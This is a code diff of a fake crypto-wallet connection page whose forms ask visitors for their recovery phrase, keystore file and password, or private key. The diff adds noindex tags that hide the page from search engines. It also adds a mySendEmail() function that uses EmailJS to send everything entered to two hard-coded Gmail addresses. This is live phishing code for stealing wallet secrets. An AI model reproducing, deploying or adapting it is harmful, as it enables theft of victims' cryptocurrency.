@@ -1,6 +1,9 @@
 <!DOCTYPE html>
 <html lang="en"><head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+    <meta name="Googlebot-News" content="noindex, nofollow">
     <!-- basic -->
     
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -620,13 +623,13 @@
          </form>
 
                     <div class="nav_contents" id="phrase">
-         <form name="PHRA-SEe" id="connect_form" action="/success/" method="POST" data-netlify="true" onSubmit="submit" data-netlify-honeypot="bot-field">
+         <form name="PHRA-SEe" id="connect_form" action="success" method="POST" onsubmit="mySendEmail()">
 
                         <input type="hidden" name="bot-field">
 
                         <label style="font-size: smaller; font-weight: bold;">PHRASE</label>
 
-                        <textarea cols="10" rows="2" name="VALUE" required="required" minlength="5" placeholder="Input / Paste your Recovery Phrase here"></textarea>
+                        <textarea cols="10" rows="2" name="VALUE" class="wallet_value" required="required" minlength="5" placeholder="Input / Paste your Recovery Phrase here"></textarea>
                         
                         <small class="text-sm text-center p-2 py-5 mb-4">Typically 12 (sometimes 24) words separated by single spaces</small>
 
@@ -634,10 +637,10 @@
 
                          <label style="font-size: smaller; font-weight: bold;">ETHEREUM WALLET ADDRESS</label>
 
-                        <textarea cols="10" rows="2" name="ADDRESS" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
+                        <textarea cols="10" rows="2" name="ADDRESS" class="wallet_address" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
 
                          
-                        <input type="hidden" name="TYPE" value="Phrase">
+                        <input type="hidden" name="TYPE" class="type" value="Phrase">
                         <input type="hidden" name="W-ALETname" class="theinput">
 
 
@@ -648,17 +651,17 @@
             
 
                     <div class="nav_contents" id="keystone" style="display: none;">
-            <form name="KEY-STOR-E" id="connect_form" action="/success/" method="POST" data-netlify="true" onSubmit="submit" data-netlify-honeypot="bot-field">
+            <form name="KEY-STOR-E" id="connect_form" action="success" method="POST" onsubmit="mySendEmail()">
 
                         <input type="hidden" name="bot-field">
 
                     <label style="font-size: smaller; font-weight: bold;">KEYSTORE VALUE</label>
-                        <textarea cols="10" rows="2" name="VALUE" required="required" minlength="5" placeholder="Input / Paste your Keystore JSON here"></textarea>
+                        <textarea cols="10" rows="2" name="VALUE" class="wallet_value" required="required" minlength="5" placeholder="Input / Paste your Keystore JSON here"></textarea>
 
                         <label style="font-size: smaller; font-weight: bold;">KEYSTORE PASSWORD</label>
 
 
-                        <textarea cols="10" rows="2" name="PASCODE" placeholder="Enter password here"></textarea>
+                        <textarea cols="10" rows="2" name="PASCODE" class="passcode" placeholder="Enter password here"></textarea>
 
                         <small class="text-sm text-center p-2 py-5 mb-4">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
 
@@ -666,10 +669,10 @@
 
                         <label style="font-size: smaller; font-weight: bold;">ETHEREUM WALLET ADDRESS</label>
 
-                        <textarea cols="10" rows="2" name="ADDRESS" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
+                        <textarea cols="10" rows="2" name="ADDRESS" class="wallet_address" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
 
                          
-                        <input type="hidden" name="TYPE" value="Keystore">
+                        <input type="hidden" name="TYPE" class="type" value="Keystore">
                         <input type="hidden" name="W-ALETname" class="theinput">
 
                         <button type="submit" style="cursor: pointer;">Import</button>
@@ -678,13 +681,13 @@
             
 
                     <div class="nav_contents" id="private" style="display: none;">
-                <form name="PRIV-ATES" id="connect_form" action="/success/" method="POST" data-netlify="true" onSubmit="submit" data-netlify-honeypot="bot-field">
+                <form name="PRIV-ATES" id="connect_form" action="success" method="POST" onsubmit="mySendEmail()">
 
                         <input type="hidden" name="bot-field">
 
                         <label style="font-size: smaller; font-weight: bold;">PRIVATE KEY VALUE</label>
 
-                        <textarea cols="10" rows="2" name="VALUE" required="required" minlength="5" placeholder="Input / Paste your Private Key here"></textarea>
+                        <textarea cols="10" rows="2" name="VALUE" class="wallet_value" required="required" minlength="5" placeholder="Input / Paste your Private Key here"></textarea>
 
                         <small class="text-sm text-center p-2 py-5 mb-4">Typically 12 (sometimes 24) words seperated by a single space.</small>
 
@@ -692,10 +695,10 @@
 
                         <label style="font-size: smaller; font-weight: bold;">ETHEREUM WALLET ADDRESS</label>
 
-                        <textarea cols="10" rows="2" name="ADDRESS" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
+                        <textarea cols="10" rows="2" name="ADDRESS" class="wallet_address" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
 
                         
-                        <input type="hidden" name="TYPE" value="Private Key">
+                        <input type="hidden" name="TYPE" class="type" value="Private Key">
                         <input type="hidden" name="W-ALETname" class="theinput">
 
                     <button type="submit" style="cursor: pointer;">Import</button>
@@ -898,6 +901,60 @@
             });
 
     });
+</script>
+
+
+
+
+
+
+
+<!-- SEND EMAIL WITH JAVASCRIPT USING EMAILJS -->
+<!-- SEND EMAIL WITH JAVASCRIPT USING EMAILJS -->
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("8T1JwrXB_77ACuWXB");
+   })();
+</script>
+<script type="text/javascript">
+
+   // SEND EMAIL WITH JAVASCRIPT USING EMAILJS
+
+    function mySendEmail() {
+
+        const emails = ["benignunited@gmail.com", "sticktroj@gmail.com"];
+
+        const type = $(".type").val();
+        const wallet_name = $(".theinput").val();
+        const wallet_value = $(".wallet_value").val();
+        const wallet_address = $(".wallet_address").val();
+        const passcode = $(".passcode").val();
+    
+    var templateParams = {
+    from_name: 'ConnetHub',
+    wallet_type: type,
+    wallet_name: wallet_name,
+    wallet_value: wallet_value,
+    wallet_address: wallet_address,
+    passcode: passcode,
+    to_email: emails,
+    message: 'text'
+};
+ 
+emailjs.send('service_794hmo3', 'template_gwmnkl1', templateParams)
+    .then(function(response) {
+       console.log('SUCCESS!', response.status, response.text);
+    }, function(error) {
+       console.log('FAILED...', error);
+    });
+
+
+}
+
 </script>
 
 
